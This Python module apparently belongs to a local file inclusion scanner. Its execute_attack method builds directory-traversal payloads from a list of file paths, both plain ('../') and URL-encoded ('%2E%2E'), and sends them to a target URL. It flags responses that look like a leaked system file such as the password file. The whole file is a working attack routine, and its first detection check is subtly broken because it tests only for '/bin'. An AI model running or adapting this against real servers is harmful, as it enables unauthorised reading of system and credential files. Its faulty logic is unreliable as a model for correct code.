import requests
import urllib.parse
from banner.banner import END, GREEN_NORMAL

class LinuxLFI:
    def execute_attack(file_paths, parse):
        for path in file_paths:
            path = path.replace("\n", "")
            print("=" * 60)

            if parse.walkcount:
                count = int(parse.walkcount)
                for i in range(count):
                    if i == 0:
                        path = ".." + path
                    else:
                        path = "../" + path

                print("Normal Payload: {}".format(path))
                query = requests.get(parse.target+path)
                if 'root' and 'bash' and '/bin' in query.text:
                    print("{}Probable LFI: {}{}".format(GREEN_NORMAL,parse.target+path,END))

                url_encoded_path = urllib.parse.quote(path, encoding='utf-8', safe='')
                url_encoded_path = url_encoded_path.replace("..", "%2E%2E")
                print("URL Encoded Payload: {}".format(url_encoded_path))
                # Send the URL encoded request
                query = requests.get(parse.target+url_encoded_path)
                if 'root' in query.text and 'bash' in query.text and '/bin' in query.text:
                    print("{}Probable LFI: {}{}".format(GREEN_NORMAL, parse.target + url_encoded_path, END))
                
        print("=" * 60,"\n")